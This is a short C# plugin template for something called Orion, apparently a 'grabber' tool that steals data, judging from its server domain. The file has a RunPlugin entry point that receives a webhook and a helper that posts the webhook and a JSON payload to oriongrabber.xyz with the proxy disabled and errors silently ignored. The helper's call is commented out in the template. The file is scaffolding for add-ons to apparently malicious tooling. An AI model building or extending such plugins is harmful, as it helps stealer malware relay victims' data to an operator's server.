using System.Collections.Specialized;
using System.Net;

//Do not change the name
namespace OrionPlugin
{
    //Dont change the name
    public class Plugin
    {
        /// <summary>
        /// The entry point of the plugin, do not change the method name.
        /// Only parameter types of string, int and char are currently supported
        /// If you want to use the SendWebhook method, add "string webhook" as the last parameter and it will pass itself automatically
        /// </summary>
        public static void RunPlugin(string webhook)
        {
            //SendToWebhook(webhook, Resource1.jsonPayload);
        }


        /// <summary>
        /// Allows you to send an embed to a webhook using a custom json payload.
        /// Only pass the webhook parameter
        /// </summary>
        /// <param name="webhook">The webhook it will be sent to, pass it from the RunPlugin method parameter</param>
        /// <param name="jsonPayload">Custom Json Payload to make the embed</param>
        private static void SendToWebhook(string webhook, string jsonPayload)
        {
            
            WebClient wc = new() { Proxy = null };
            NameValueCollection nvc = new();
            nvc.Add("webhook", webhook);
            nvc.Add("payload", jsonPayload);
            try
            {
                wc.UploadValues("https://oriongrabber.xyz/plugin.php", nvc);
            }
            catch
            {
            }
        }

    }
}
